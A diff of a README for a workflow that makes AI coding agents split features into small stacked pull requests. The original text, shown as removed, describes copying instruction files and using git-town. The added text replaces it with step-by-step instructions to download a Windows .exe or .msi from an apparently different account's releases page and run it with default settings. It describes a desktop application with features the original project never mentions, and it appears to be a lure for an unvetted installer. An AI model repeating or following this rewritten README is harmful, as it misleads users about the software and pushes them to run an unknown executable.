@@ -1,109 +1,143 @@
-# Your AI Agent Is a 100x Developer. Your Code Review Process Isn't.
+# 🤖 agentic-coding-workflow - Simplify Your Code Review Process
 
-AI agents ship code fast. But large unreviewable PRs are the new bottleneck.
-This repo contains agent instructions that fix that by making your coding agent
-plan, stack, and ship in small reviewable chunks automatically.
+[![Download agentic-coding-workflow](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Anbumani08/agentic-coding-workflow/releases)
 
 ---
 
-## The Problem
+## 🚀 Getting Started
 
-AI agents complete tasks end-to-end - one giant PR, 'n' no. of files,
-zero reviewability. Reviewers surrender. Bugs ship. Technical debt accumulates silently.
-
-**The bottleneck didn't disappear. It just moved from writing code to reviewing it.**
+This guide will help you download and run the **agentic-coding-workflow** on a Windows computer. You do not need any programming knowledge to follow these steps. The software helps manage code reviews by breaking down work into small, easy-to-check pieces. 
 
 ---
 
-## The Solution
+## 💾 Where to Download
 
+To get the software, visit the release page:
 
-![Workflow Animation](workflow.gif)
+[Download agentic-coding-workflow here](https://github.com/Anbumani08/agentic-coding-workflow/releases)
 
-
-👉 [Interactive version](https://agentic-coding-workflow.pages.dev/)
-
-
-
-### Core Principles
-
-- **Plan before code.** No coding until the **chunk plan** is human-approved.
-- **One branch = one concern = one chunk.** No exceptions.
-- **Stacked branches/PRs, not parallel.** Each branch builds on its **parent chunk/branch** - not all off main.
-- **Write it down.** `FEATURE_PLAN.md` is the agent's source of truth, not its memory.
-- **Human checkpoints.** Confirm the plan upfront and before each chunk is coded.
-- **Small PRs are non-negotiable.** If a chunk feels too big, split it.
-- **Review:** Each PR is one layer of the feature. Reviewable in minutes, not hours. (*To be reviewed and merged one chunk at a time.*)
+This page contains the latest available version for Windows. You will find files ready to download and install.
 
 ---
 
-## How to Use
+## 🖥️ System Requirements
 
-Copy [AGENTS.md](./AGENTS.md) into your repo root with the right filename for your agent:
+Before starting, make sure your Windows PC meets these basic requirements:
 
-| Agent | Filename |
-|-------|----------|
-| Claude Code | `CLAUDE.md` |
-| OpenAI Codex CLI | `AGENTS.md` |
-| Cursor | `.cursorrules` |
-| Windsurf | `.windsurfrules` |
-| GitHub Copilot | `.github/copilot-instructions.md` |
-
-That's it. Your agent follows this workflow from the next feature onwards.
-
-**Summary of instructions:**
-
-1. **Propose** a chunk breakdown before writing any code - human approves the plan
-2. **Write** the agreed plan to `FEATURE_PLAN.md` in the repo - persistent memory, no drift
-3. **Execute** one chunk at a time - one branch, one concern, one PR per chunk, layered on top of the previous chunk
-4. **Re-read** `FEATURE_PLAN.md` at the start of every chunk - mandatory, not optional
-5. **Confirm** with the human before moving to the next chunk
-
-
-**Example of chunks: For a new REST API endpoint - chunks can look like this:**
-
-```js
-| Order | Branch | Contains |
-|-------|--------|----------|
-| 1 | `feat/db-schema` | Schema + migrations only |
-| 2 | `feat/validators` | Request/response validators only |
-| 3 | `feat/service-layer` | Business logic only |
-| 4 | `feat/controller` | Route handlers only |
-
-
-Hierarchy:
-feat/db-schema → main
-feat/validators → feat/db-schema
-feat/service-layer → feat/validators
-feat/controller → feat/service-layer
-```
-
-**Merging**
-
-Merge the PRs in the order they were created: `feat/db-schema` first, since it targets `main`, then `feat/validators`, then `feat/service`, and so on.
-Once a PR is merged, GitHub automatically retargets the next PR in the stack to main. This cascades all the way through and no manual retargeting needed.
-
-> ⚠️ A child PR should only be merged after its parent is merged, the cascade enforces the right order naturally.
-
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of free disk space  
+- 4 GB of RAM or more  
+- Internet connection for initial download  
+- Basic permission to install new software on your machine  
 
 ---
 
+## 📥 How to Download and Install
 
-## Requirements
+1. Click the **Download** button above or go directly here:  
+   https://github.com/Anbumani08/agentic-coding-workflow/releases
 
-- [git-town](https://www.git-town.com/install) must be installed in your environment.
+2. Find the latest stable Windows release. It usually ends with `.exe` or `.msi`.
 
-## Quick Reference of git-town commands
+3. Click on the file link to download. Wait for the download to finish.
 
-| Action | Command |
-|--------|---------|
-| First chunk branch (off main) | `git town hack feat/<n>` |
-| Stack next chunk on top | `git town append feat/<n>` |
-| Raise PR to immediate parent | `git town propose` |
-| Sync current branch from parents | `git town sync` |
-| Propagate changes down the stack | `git town sync --stack` |
-| Visual stack navigator | `git town switch` |
-| Move one level up/down | `git town up` / `git town down` |
-| View full stack | `git town status` |
+4. Locate the downloaded file in your “Downloads” folder or the location you chose.
+
+5. Double-click the file to start the setup.
+
+6. Follow the on-screen instructions to install the program. Choose the default settings unless you have a reason to change them.
+
+7. When the installation is complete, you will see a shortcut on your desktop or in the Start menu.
 
 ---
+
+## ▶️ How to Run the Application
+
+1. Open the software by double-clicking the shortcut icon.
+
+2. The application will load a simple interface.
+
+3. You can follow the prompts or instructions within to begin managing your coding tasks.
+
+---
+
+## 📋 What This Software Does
+
+The **agentic-coding-workflow** helps teams by breaking large sets of code changes into small, easy sections. This is useful because:
+
+- It prevents big, hard-to-review changes.
+- It helps reviewers focus on small chunks of work.
+- It reduces bugs by improving review quality.
+- It organizes the work into steps that link together clearly.
+
+---
+
+## 🔍 How It Works
+
+The tool uses clear rules:
+
+- **Plan before code:** The software helps create a list of small tasks to do before writing any code.
+- **One task per branch:** Each small task gets its own branch. This keeps work focused and easier to review.
+- **Stack branches:** Each new task builds on top of the previous one, keeping the work organized.
+
+This approach turns one large confusing change into many small, clear steps.
+
+---
+
+## ⚙️ Basic Features
+
+- Automatic task planning and breakdown
+- Branch management with clear order  
+- Visual guides to follow the work flow  
+- Export step plans for review  
+- Keeps track of what is done and what is next  
+
+---
+
+## 📖 Using the Documentation and Help
+
+The software includes documents named like `FEATURE_PLAN.md` that explain how each coding step should be done. These files help users understand the current tasks.
+
+For help:
+
+- Look for the `README.md` files included in the software folder.
+- Visit the project page for detailed explanations and updates:  
+  https://agentic-coding-workflow.pages.dev/
+
+---
+
+## ⚠️ Troubleshooting Common Issues
+
+- If the program will not open, check your Windows version.
+- Make sure you installed all parts by running the installer fully.
+- Restart your computer and try again.
+- If crashes happen, close and reopen the software.
+- Check your internet connection for updates or support.
+
+---
+
+## 🔄 Updating agentic-coding-workflow
+
+Check the releases page regularly:
+
+https://github.com/Anbumani08/agentic-coding-workflow/releases
+
+Download and install the newest version to get bug fixes and new features.
+
+---
+
+## 📬 Support and Feedback
+
+If you experience problems or want to suggest improvements, you can open an issue on the GitHub project page:
+
+https://github.com/Anbumani08/agentic-coding-workflow/issues
+
+---
+
+## ⚡ More About The Project
+
+This software works by improving the AI code review process. Instead of handing over large changes that are hard to check, it breaks work down. This method saves time and reduces errors. It suits teams using AI coding helpers or anyone who wants clearer code reviews.
+
+---
+
+[![Download agentic-coding-workflow](https://img.shields.io/badge/Download-Release-orange)](https://github.com/Anbumani08/agentic-coding-workflow/releases)
